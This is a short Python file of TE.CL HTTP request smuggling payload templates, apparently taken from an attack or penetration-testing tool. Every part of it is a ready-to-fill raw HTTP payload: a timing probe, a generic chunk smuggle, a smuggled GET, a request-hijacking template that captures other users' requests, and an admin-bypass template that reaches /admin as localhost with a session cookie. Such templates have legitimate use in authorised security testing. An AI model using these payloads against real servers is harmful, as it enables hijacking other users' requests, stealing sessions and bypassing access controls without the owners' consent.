"""
TE.CL Payload Templates

Transfer-Encoding prioritized by front-end, Content-Length by back-end.
"""

# Basic timing probe
# TE makes front-end see complete request, but CL leaves extra data for back-end
TIMING_PROBE = """POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X"""

# Request smuggle with full request in chunk
CHUNK_SMUGGLE = """POST {path} HTTP/1.1
Host: {host}
Content-Length: 4
Transfer-Encoding: chunked

{chunk_size}
{smuggled_request}
0

"""

# Smuggled GET request
SMUGGLE_GET = """POST {path} HTTP/1.1
Host: {host}
Content-Length: 4
Transfer-Encoding: chunked

{chunk_size}
GET {smuggled_path} HTTP/1.1
Host: {host}
Content-Length: 10

x=
0

"""

# Request hijacking template
REQUEST_HIJACK = """POST {path} HTTP/1.1
Host: {host}
Content-Length: 4
Transfer-Encoding: chunked

{chunk_size}
POST {capture_path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

data=
0

"""

# Admin bypass template
ADMIN_BYPASS = """POST {path} HTTP/1.1
Host: {host}
Content-Length: 4
Transfer-Encoding: chunked

{chunk_size}
GET /admin HTTP/1.1
Host: localhost
Cookie: session={session}

0

"""
